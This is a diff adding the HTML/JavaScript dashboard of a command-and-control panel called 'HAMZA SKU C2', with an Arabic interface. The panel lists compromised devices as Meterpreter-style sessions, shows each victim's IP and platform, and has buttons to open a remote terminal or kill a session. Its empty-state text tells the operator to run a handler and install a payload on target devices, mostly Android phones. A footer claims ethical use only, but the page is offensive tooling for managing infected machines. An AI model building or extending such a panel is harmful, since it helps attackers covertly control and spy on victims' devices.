@@ -1,0 +1,1133 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>⛓️ HAMZA SKU C2 - Command & Control</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+    <style>
+        :root {
+            --primary: #00ff88;
+            --primary-dark: #00cc66;
+            --secondary: #0088ff;
+            --danger: #ff0055;
+            --warning: #ffaa00;
+            --dark: #0a0e1a;
+            --darker: #070a13;
+            --light: #e0e6ed;
+            --gray: #8b95a8;
+            --card-bg: rgba(15, 18, 28, 0.95);
+            --terminal-bg: #000000;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', 'Tahoma', 'Geneva', 'Verdana', sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, var(--darker), var(--dark));
+            color: var(--light);
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+        
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(circle at 20% 30%, rgba(0, 255, 136, 0.05) 0%, transparent 50%),
+                radial-gradient(circle at 80% 70%, rgba(0, 136, 255, 0.05) 0%, transparent 50%),
+                radial-gradient(circle at 40% 80%, rgba(255, 0, 85, 0.03) 0%, transparent 50%);
+            z-index: -1;
+        }
+        
+        .noise-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 400 400' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noiseFilter'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noiseFilter)' opacity='0.1'/%3E%3C/svg%3E");
+            pointer-events: none;
+            z-index: -1;
+        }
+        
+        .container {
+            max-width: 1600px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        /* Header Styles */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+            margin-bottom: 30px;
+            border-bottom: 2px solid rgba(0, 255, 136, 0.2);
+            position: relative;
+        }
+        
+        .header::after {
+            content: '';
+            position: absolute;
+            bottom: -2px;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--primary), transparent);
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .logo-icon {
+            font-size: 32px;
+            color: var(--primary);
+            text-shadow: 0 0 15px var(--primary);
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+        
+        .logo-text h1 {
+            color: var(--primary);
+            font-size: 28px;
+            font-weight: 800;
+            letter-spacing: 1px;
+            text-shadow: 0 0 20px rgba(0, 255, 136, 0.5);
+            margin-bottom: 5px;
+        }
+        
+        .logo-text .subtitle {
+            color: var(--gray);
+            font-size: 12px;
+            font-weight: 500;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+        
+        .header-actions {
+            display: flex;
+            gap: 15px;
+            align-items: center;
+        }
+        
+        .user-info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background: rgba(0, 255, 136, 0.1);
+            padding: 8px 15px;
+            border-radius: 8px;
+            border: 1px solid rgba(0, 255, 136, 0.3);
+        }
+        
+        .user-info i {
+            color: var(--primary);
+        }
+        
+        .btn {
+            padding: 12px 25px;
+            border: none;
+            border-radius: 8px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            font-size: 14px;
+            letter-spacing: 0.5px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
+            transition: left 0.5s;
+        }
+        
+        .btn:hover::before {
+            left: 100%;
+        }
+        
+        .btn-reload {
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            color: var(--dark);
+            box-shadow: 0 4px 15px rgba(0, 255, 136, 0.3);
+        }
+        
+        .btn-reload:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0, 255, 136, 0.5);
+        }
+        
+        .btn-back {
+            background: linear-gradient(135deg, var(--secondary), #0066cc);
+            color: white;
+            text-decoration: none;
+            box-shadow: 0 4px 15px rgba(0, 136, 255, 0.3);
+        }
+        
+        .btn-back:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0, 136, 255, 0.5);
+        }
+        
+        /* Stats Cards */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        
+        .stat-card {
+            background: var(--card-bg);
+            border: 1px solid rgba(0, 255, 136, 0.2);
+            border-radius: 15px;
+            padding: 25px;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .stat-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 5px;
+            background: linear-gradient(90deg, var(--primary), transparent);
+        }
+        
+        .stat-card:hover {
+            transform: translateY(-5px);
+            border-color: var(--primary);
+            box-shadow: 0 10px 30px rgba(0, 255, 136, 0.15);
+        }
+        
+        .stat-card.danger {
+            border-color: rgba(255, 0, 85, 0.2);
+        }
+        
+        .stat-card.danger::before {
+            background: linear-gradient(90deg, var(--danger), transparent);
+        }
+        
+        .stat-card.warning {
+            border-color: rgba(255, 170, 0, 0.2);
+        }
+        
+        .stat-card.warning::before {
+            background: linear-gradient(90deg, var(--warning), transparent);
+        }
+        
+        .stat-card.info {
+            border-color: rgba(0, 136, 255, 0.2);
+        }
+        
+        .stat-card.info::before {
+            background: linear-gradient(90deg, var(--secondary), transparent);
+        }
+        
+        .stat-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        
+        .stat-icon {
+            font-size: 32px;
+            width: 60px;
+            height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 12px;
+            background: rgba(0, 255, 136, 0.1);
+            color: var(--primary);
+        }
+        
+        .stat-card.danger .stat-icon {
+            background: rgba(255, 0, 85, 0.1);
+            color: var(--danger);
+        }
+        
+        .stat-card.warning .stat-icon {
+            background: rgba(255, 170, 0, 0.1);
+            color: var(--warning);
+        }
+        
+        .stat-card.info .stat-icon {
+            background: rgba(0, 136, 255, 0.1);
+            color: var(--secondary);
+        }
+        
+        .stat-trend {
+            font-size: 14px;
+            font-weight: 600;
+            padding: 4px 10px;
+            border-radius: 20px;
+            background: rgba(0, 255, 136, 0.1);
+            color: var(--primary);
+        }
+        
+        .stat-number {
+            font-size: 42px;
+            font-weight: 800;
+            color: var(--primary);
+            line-height: 1;
+            margin: 10px 0;
+            text-shadow: 0 0 10px rgba(0, 255, 136, 0.3);
+        }
+        
+        .stat-card.danger .stat-number {
+            color: var(--danger);
+            text-shadow: 0 0 10px rgba(255, 0, 85, 0.3);
+        }
+        
+        .stat-card.warning .stat-number {
+            color: var(--warning);
+            text-shadow: 0 0 10px rgba(255, 170, 0, 0.3);
+        }
+        
+        .stat-card.info .stat-number {
+            color: var(--secondary);
+            text-shadow: 0 0 10px rgba(0, 136, 255, 0.3);
+        }
+        
+        .stat-label {
+            color: var(--gray);
+            font-size: 14px;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        /* Main Content Card */
+        .main-card {
+            background: var(--card-bg);
+            border: 1px solid rgba(0, 255, 136, 0.2);
+            border-radius: 15px;
+            overflow: hidden;
+            margin-bottom: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        }
+        
+        .card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 30px;
+            background: rgba(0, 255, 136, 0.05);
+            border-bottom: 1px solid rgba(0, 255, 136, 0.1);
+        }
+        
+        .card-title {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: var(--primary);
+            font-size: 20px;
+            font-weight: 700;
+        }
+        
+        .card-title i {
+            font-size: 22px;
+        }
+        
+        .last-update {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: var(--gray);
+            font-size: 13px;
+        }
+        
+        .last-update i {
+            color: var(--primary);
+        }
+        
+        /* Sessions Table */
+        .table-container {
+            overflow-x: auto;
+            padding: 0;
+        }
+        
+        .sessions-table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        
+        .sessions-table thead {
+            background: rgba(0, 255, 136, 0.05);
+        }
+        
+        .sessions-table th {
+            padding: 18px 20px;
+            text-align: right;
+            color: var(--primary);
+            font-weight: 700;
+            font-size: 13px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            border-bottom: 1px solid rgba(0, 255, 136, 0.1);
+            white-space: nowrap;
+        }
+        
+        .sessions-table tbody tr {
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            transition: all 0.2s ease;
+            cursor: pointer;
+        }
+        
+        .sessions-table tbody tr:hover {
+            background: rgba(0, 255, 136, 0.08);
+            transform: scale(1.01);
+        }
+        
+        .sessions-table td {
+            padding: 18px 20px;
+            text-align: right;
+            font-size: 14px;
+        }
+        
+        .status-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+        }
+        
+        .status-online {
+            background: rgba(0, 255, 136, 0.15);
+            color: var(--primary);
+            border: 1px solid rgba(0, 255, 136, 0.3);
+        }
+        
+        .status-offline {
+            background: rgba(255, 0, 85, 0.15);
+            color: var(--danger);
+            border: 1px solid rgba(255, 0, 85, 0.3);
+        }
+        
+        .platform-badge {
+            display: inline-block;
+            padding: 6px 12px;
+            border-radius: 6px;
+            font-size: 12px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        .platform-android {
+            background: linear-gradient(135deg, #3ddc84, #2db669);
+            color: #000;
+        }
+        
+        .platform-windows {
+            background: linear-gradient(135deg, #0078d4, #005a9e);
+            color: #fff;
+        }
+        
+        .platform-linux {
+            background: linear-gradient(135deg, #fcc624, #e8b000);
+            color: #000;
+        }
+        
+        .platform-ios {
+            background: linear-gradient(135deg, #000000, #333333);
+            color: #fff;
+        }
+        
+        .platform-unknown {
+            background: linear-gradient(135deg, #8b95a8, #6c7688);
+            color: #fff;
+        }
+        
+        .session-id {
+            font-family: 'Courier New', monospace;
+            font-weight: 700;
+            color: var(--primary);
+            letter-spacing: 1px;
+        }
+        
+        .session-ip {
+            font-family: 'Courier New', monospace;
+            color: var(--secondary);
+            font-weight: 600;
+        }
+        
+        .session-actions {
+            display: flex;
+            gap: 8px;
+        }
+        
+        .session-action-btn {
+            width: 36px;
+            height: 36px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 8px;
+            background: rgba(0, 136, 255, 0.1);
+            color: var(--secondary);
+            border: 1px solid rgba(0, 136, 255, 0.2);
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+        
+        .session-action-btn:hover {
+            background: rgba(0, 136, 255, 0.2);
+            transform: translateY(-2px);
+        }
+        
+        .session-action-btn.danger {
+            background: rgba(255, 0, 85, 0.1);
+            color: var(--danger);
+            border: 1px solid rgba(255, 0, 85, 0.2);
+        }
+        
+        .session-action-btn.danger:hover {
+            background: rgba(255, 0, 85, 0.2);
+        }
+        
+        /* Empty State */
+        .empty-state {
+            padding: 60px 30px;
+            text-align: center;
+            color: var(--gray);
+        }
+        
+        .empty-icon {
+            font-size: 64px;
+            margin-bottom: 20px;
+            opacity: 0.5;
+        }
+        
+        .empty-state h3 {
+            font-size: 22px;
+            margin-bottom: 10px;
+            color: var(--light);
+        }
+        
+        .empty-state p {
+            max-width: 500px;
+            margin: 0 auto 20px;
+            line-height: 1.6;
+        }
+        
+        /* Loading State */
+        .loading-state {
+            padding: 60px 30px;
+            text-align: center;
+        }
+        
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 3px solid rgba(0, 255, 136, 0.1);
+            border-top-color: var(--primary);
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding: 20px 0;
+            margin-top: 30px;
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+            color: var(--gray);
+            font-size: 12px;
+        }
+        
+        .footer a {
+            color: var(--primary);
+            text-decoration: none;
+        }
+        
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        
+        /* Notification Styles */
+        .notification {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            right: 20px;
+            max-width: 400px;
+            background: var(--card-bg);
+            border-left: 4px solid var(--primary);
+            border-radius: 8px;
+            padding: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+            z-index: 1000;
+            animation: slideIn 0.3s ease;
+            margin: 0 auto;
+        }
+        
+        .notification-danger { border-left-color: var(--danger); }
+        .notification-success { border-left-color: var(--primary); }
+        .notification-warning { border-left-color: var(--warning); }
+        .notification-content {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .notification-close {
+            background: none;
+            border: none;
+            color: var(--gray);
+            cursor: pointer;
+            font-size: 14px;
+        }
+        
+        @keyframes slideIn {
+            from { transform: translateY(-100%); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        
+        /* Responsive */
+        @media (max-width: 1200px) {
+            .stats-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+        
+        @media (max-width: 768px) {
+            .header {
+                flex-direction: column;
+                gap: 20px;
+                text-align: center;
+            }
+            
+            .header-actions {
+                width: 100%;
+                justify-content: center;
+            }
+            
+            .stats-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .card-header {
+                flex-direction: column;
+                gap: 15px;
+                text-align: center;
+            }
+            
+            .session-actions {
+                flex-direction: column;
+                gap: 5px;
+            }
+            
+            .session-action-btn {
+                width: 32px;
+                height: 32px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="noise-overlay"></div>
+    
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <div class="logo">
+                <div class="logo-icon">⛓️</div>
+                <div class="logo-text">
+                    <h1>HAMZA SKU C2</h1>
+                    <div class="subtitle">COMMAND & CONTROL CENTER</div>
+                </div>
+            </div>
+            
+            <div class="header-actions">
+                <div class="user-info">
+                    <i class="fas fa-user-secret"></i>
+                    <span>ADMIN</span>
+                </div>
+                <button class="btn btn-reload" onclick="reloadSessions()">
+                    <i class="fas fa-sync-alt"></i>
+                    تحديث البيانات
+                </button>
+                <a href="/" class="btn btn-back">
+                    <i class="fas fa-cogs"></i>
+                    الإعدادات
+                </a>
+            </div>
+        </div>
+        
+        <!-- Stats Cards -->
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-header">
+                    <div class="stat-icon">
+                        <i class="fas fa-satellite-dish"></i>
+                    </div>
+                    <div class="stat-trend">
+                        <i class="fas fa-arrow-up"></i> 12%
+                    </div>
+                </div>
+                <div class="stat-number" id="total-sessions">0</div>
+                <div class="stat-label">إجمالي الأجهزة النشطة</div>
+            </div>
+            
+            <div class="stat-card info">
+                <div class="stat-header">
+                    <div class="stat-icon">
+                        <i class="fas fa-link"></i>
+                    </div>
+                    <div class="stat-trend">
+                        <i class="fas fa-wifi"></i> مباشر
+                    </div>
+                </div>
+                <div class="stat-number" id="online-sessions">0</div>
+                <div class="stat-label">جلسات متصلة الآن</div>
+            </div>
+            
+            <div class="stat-card warning">
+                <div class="stat-header">
+                    <div class="stat-icon">
+                        <i class="fab fa-android"></i>
+                    </div>
+                    <div class="stat-trend">
+                        <i class="fas fa-mobile-alt"></i> 78%
+                    </div>
+                </div>
+                <div class="stat-number" id="android-count">0</div>
+                <div class="stat-label">أجهزة أندرويد</div>
+            </div>
+            
+            <div class="stat-card danger">
+                <div class="stat-header">
+                    <div class="stat-icon">
+                        <i class="fas fa-desktop"></i>
+                    </div>
+                    <div class="stat-trend">
+                        <i class="fas fa-server"></i> متنوع
+                    </div>
+                </div>
+                <div class="stat-number" id="other-count">0</div>
+                <div class="stat-label">أنظمة أخرى</div>
+            </div>
+        </div>
+        
+        <!-- Sessions Table -->
+        <div class="main-card">
+            <div class="card-header">
+                <h2 class="card-title">
+                    <i class="fas fa-terminal"></i>
+                    الجلسات النشطة - نظام المراقبة والتحكم
+                </h2>
+                <div class="last-update">
+                    <i class="fas fa-clock"></i>
+                    <span id="last-update">آخر تحديث: --:--:--</span>
+                </div>
+            </div>
+            
+            <div class="table-container">
+                <div id="table-container">
+                    <div class="loading-state">
+                        <div class="spinner"></div>
+                        <div>جاري تحميل بيانات الجلسات النشطة...</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Footer -->
+        <div class="footer">
+            <p>HAMZA SKU C2 - Command & Control System v2.6.1 | للاستخدام الأخلاقي فقط</p>
+            <p>جميع الحقوق محفوظة © 2024 | نظام مرخص للخبراء المعتمدين</p>
+        </div>
+    </div>
+
+    <script>
+        const socket = io();
+        let knownSessions = new Set();
+        let sessionsData = [];
+        
+        socket.on('connect', () => {
+            console.log('🟢 متصل بالسيرفر - نظام C2 نشط');
+            loadSessions();
+        });
+        
+        socket.on('new_session', (session) => {
+            console.log('🟡 جلسة جديدة:', session);
+            if (!knownSessions.has(session.id)) {
+                showNotification(`جلسة جديدة: ${session.id} من ${session.ip}`, 'success');
+                loadSessions();
+            }
+        });
+        
+        socket.on('session_disconnected', (sessionId) => {
+            console.log('🔴 جلسة منقطعة:', sessionId);
+            showNotification(`جلسة منقطعة: ${sessionId}`, 'danger');
+            loadSessions();
+        });
+        
+        socket.on('sessions_update', (data) => {
+            console.log('🔄 تحديث الجلسات');
+            updateSessions(data.sessions);
+        });
+        
+        function showNotification(message, type = 'info') {
+            // التحقق من وجود أنماط الإشعارات
+            if (!document.getElementById('notification-styles')) {
+                const style = document.createElement('style');
+                style.id = 'notification-styles';
+                style.textContent = `
+                    .notification {
+                        position: fixed;
+                        top: 20px;
+                        left: 20px;
+                        right: 20px;
+                        max-width: 400px;
+                        background: var(--card-bg);
+                        border-left: 4px solid var(--primary);
+                        border-radius: 8px;
+                        padding: 15px;
+                        display: flex;
+                        justify-content: space-between;
+                        align-items: center;
+                        box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+                        z-index: 1000;
+                        animation: slideIn 0.3s ease;
+                        margin: 0 auto;
+                    }
+                    .notification-danger { border-left-color: var(--danger); }
+                    .notification-success { border-left-color: var(--primary); }
+                    .notification-warning { border-left-color: var(--warning); }
+                    .notification-content {
+                        display: flex;
+                        align-items: center;
+                        gap: 10px;
+                    }
+                    .notification-close {
+                        background: none;
+                        border: none;
+                        color: var(--gray);
+                        cursor: pointer;
+                        font-size: 14px;
+                    }
+                    @keyframes slideIn {
+                        from { transform: translateY(-100%); opacity: 0; }
+                        to { transform: translateY(0); opacity: 1; }
+                    }
+                `;
+                document.head.appendChild(style);
+            }
+            
+            // إنشاء عنصر الإشعار
+            const notification = document.createElement('div');
+            notification.className = `notification notification-${type}`;
+            notification.innerHTML = `
+                <div class="notification-content">
+                    <i class="fas fa-${type === 'success' ? 'check-circle' : type === 'danger' ? 'exclamation-circle' : 'info-circle'}"></i>
+                    <span>${message}</span>
+                </div>
+                <button class="notification-close" onclick="this.parentElement.remove()">
+                    <i class="fas fa-times"></i>
+                </button>
+            `;
+            
+            // إضافة إلى body وإزالة بعد 5 ثواني
+            document.body.appendChild(notification);
+            setTimeout(() => {
+                if (notification.parentElement) {
+                    notification.remove();
+                }
+            }, 5000);
+        }
+        
+        async function loadSessions() {
+            try {
+                const res = await fetch('/api/sessions');
+                
+                if (!res.ok) {
+                    throw new Error(`خطأ HTTP: ${res.status}`);
+                }
+                
+                const data = await res.json();
+                updateSessions(data.sessions || []);
+            } catch (e) {
+                console.error('❌ فشل تحميل الجلسات:', e);
+                showNotification('فشل الاتصال بالسيرفر', 'danger');
+                
+                const container = document.getElementById('table-container');
+                container.innerHTML = `
+                    <div class="empty-state">
+                        <div class="empty-icon">⚠️</div>
+                        <h3>خطأ في الاتصال بالسيرفر</h3>
+                        <p>تعذر الاتصال بخادم HAMZA SKU C2. تأكد من تشغيل السيرفر.</p>
+                        <button class="btn btn-reload" onclick="loadSessions()" style="margin-top: 20px;">
+                            <i class="fas fa-redo"></i>
+                            إعادة المحاولة
+                        </button>
+                    </div>
+                `;
+            }
+        }
+        
+        async function reloadSessions() {
+            const btn = event.currentTarget;
+            const originalText = btn.innerHTML;
+            const originalState = btn.disabled;
+            
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري التحديث...';
+            btn.disabled = true;
+            
+            await loadSessions();
+            
+            setTimeout(() => {
+                btn.innerHTML = originalText;
+                btn.disabled = originalState;
+            }, 1000);
+        }
+        
+        function updateSessions(sessions) {
+            // تحديث الطابع الزمني
+            const now = new Date();
+            document.getElementById('last-update').textContent = 
+                `آخر تحديث: ${now.toLocaleTimeString('ar-SA')}`;
+            
+            // إزالة التكرارات
+            const uniqueSessions = [];
+            const seenIds = new Set();
+            
+            sessions.forEach(s => {
+                if (s && s.id && !seenIds.has(s.id.toString())) {
+                    seenIds.add(s.id.toString());
+                    uniqueSessions.push(s);
+                }
+            });
+            
+            knownSessions = seenIds;
+            sessionsData = uniqueSessions;
+            
+            // تحديث الإحصائيات
+            document.getElementById('total-sessions').textContent = uniqueSessions.length;
+            
+            const online = uniqueSessions.filter(s => s.status === 'online').length;
+            document.getElementById('online-sessions').textContent = online;
+            
+            const android = uniqueSessions.filter(s => 
+                s.platform && s.platform.toLowerCase().includes('android')).length;
+            document.getElementById('android-count').textContent = android;
+            document.getElementById('other-count').textContent = uniqueSessions.length - android;
+            
+            const container = document.getElementById('table-container');
+            
+            if (uniqueSessions.length === 0) {
+                container.innerHTML = `
+                    <div class="empty-state">
+                        <div class="empty-icon">📡</div>
+                        <h3>لا توجد جلسات نشطة حالياً</h3>
+                        <p>يبدو أن النظام في وضع الانتظار. قم بتشغيل الـ Handler وتثبيت الـ Payload على الأجهزة المستهدفة لبدء المراقبة.</p>
+                        <a href="/" class="btn btn-back" style="margin-top: 20px;">
+                            <i class="fas fa-play-circle"></i>
+                            بدء الـ Handler
+                        </a>
+                    </div>
+                `;
+                return;
+            }
+            
+            // إنشاء HTML للجدول
+            let tableHTML = `
+                <table class="sessions-table">
+                    <thead>
+                        <tr>
+                            <th>الحالة</th>
+                            <th>النوع</th>
+                            <th>المنصة</th>
+                            <th>عنوان IP</th>
+                            <th>معرف الجلسة</th>
+                            <th>التاريخ</th>
+                            <th>الإجراءات</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+            `;
+            
+            uniqueSessions.forEach(s => {
+                // تحديد فئة المنصة
+                let platformClass = 'platform-unknown';
+                if (s.platform) {
+                    const platform = s.platform.toLowerCase();
+                    if (platform.includes('android')) platformClass = 'platform-android';
+                    else if (platform.includes('windows')) platformClass = 'platform-windows';
+                    else if (platform.includes('linux')) platformClass = 'platform-linux';
+                    else if (platform.includes('ios') || platform.includes('apple')) platformClass = 'platform-ios';
+                }
+                
+                const platformName = s.platform || 'Unknown';
+                const status = s.status || 'offline';
+                
+                // تحويل الطابع الزمني إلى تاريخ
+                let sessionDate = 'غير معروف';
+                if (s.timestamp) {
+                    try {
+                        const date = new Date(s.timestamp * 1000); // تحويل من ثواني إلى ملي ثانية
+                        sessionDate = date.toLocaleDateString('ar-SA') + ' ' + date.toLocaleTimeString('ar-SA').slice(0, 5);
+                    } catch (e) {
+                        sessionDate = 'غير معروف';
+                    }
+                }
+                
+                // إنشاء HTML للصف
+                tableHTML += `
+                    <tr onclick="openSession('${s.id}')">
+                        <td>
+                            <span class="status-badge status-${status}">
+                                <i class="fas fa-${status === 'online' ? 'wifi' : 'unlink'}"></i>
+                                ${status === 'online' ? 'متصل' : 'غير متصل'}
+                            </span>
+                        </td>
+                        <td>${s.type || 'meterpreter'}</td>
+                        <td>
+                            <span class="platform-badge ${platformClass}">
+                                ${platformName}
+                            </span>
+                        </td>
+                        <td><span class="session-ip">${s.ip || 'غير معروف'}</span></td>
+                        <td><span class="session-id">#${s.id}</span></td>
+                        <td>${sessionDate}</td>
+                        <td>
+                            <div class="session-actions" onclick="event.stopPropagation()">
+                                <button class="session-action-btn" onclick="openSession('${s.id}')" title="فتح الجلسة">
+                                    <i class="fas fa-terminal"></i>
+                                </button>
+                                <button class="session-action-btn danger" onclick="terminateSession('${s.id}', event)" title="إنهاء الجلسة">
+                                    <i class="fas fa-skull-crossbones"></i>
+                                </button>
+                            </div>
+                        </td>
+                    </tr>
+                `;
+            });
+            
+            tableHTML += `
+                    </tbody>
+                </table>
+            `;
+            
+            container.innerHTML = tableHTML;
+        }
+        
+        function openSession(id) {
+            if (!id || id === 'undefined' || id === 'null') {
+                console.error('❌ معرف الجلسة غير صالح');
+                showNotification('خطأ: معرف الجلسة غير صالح', 'danger');
+                return;
+            }
+            
+            console.log(`🔗 فتح الجلسة: ${id}`);
+            
+            // الانتقال إلى صفحة الجلسة
+            window.location.href = `/session/${encodeURIComponent(id)}`;
+            
+            // بديل: فتح في نافذة جديدة
+            // window.open(`/session/${encodeURIComponent(id)}`, '_blank');
+        }
+        
+        async function terminateSession(id, event) {
+            if (event) {
+                event.stopPropagation();
+            }
+            
+            if (!confirm('⚠️ هل أنت متأكد من إنهاء هذه الجلسة؟')) {
+                return;
+            }
+            
+            console.log(`🛑 محاولة إنهاء الجلسة: ${id}`);
+            
+            try {
+                const response = await fetch(`/api/session/${encodeURIComponent(id)}/terminate`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                });
+                
+                if (!response.ok) {
+                    throw new Error(`خطأ HTTP: ${response.status}`);
+                }
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    showNotification(`✅ تم إنهاء الجلسة ${id}`, 'success');
+                    
+                    // تحديث قائمة الجلسات بعد ثانيتين
+                    setTimeout(() => {
+                        loadSessions();
+                    }, 2000);
+                } else {
+                    showNotification(`❌ فشل إنهاء الجلسة: ${data.message || 'سبب غير معروف'}`, 'danger');
+                }
+            } catch (error) {
+                console.error('❌ خطأ في إنهاء الجلسة:', error);
+                showNotification('❌ خطأ في الاتصال بالسيرفر', 'danger');
+            }
+        }
+        
+        // تحميل الجلسات عند بدء التشغيل
+        loadSessions();
+        
+        // تحديث تلقائي كل 10 ثواني
+        setInterval(loadSessions, 10000);
+        
+        // محاكاة بعض الإشعارات للعرض التوضيحي
+        setTimeout(() => {
+            if (Math.random() > 0.7 && sessionsData.length === 0) {
+                showNotification('🔍 النظام جاهز لاستقبال الجلسات الجديدة', 'success');
+            }
+        }, 3000);
+    </script>
+</body>
+</html>
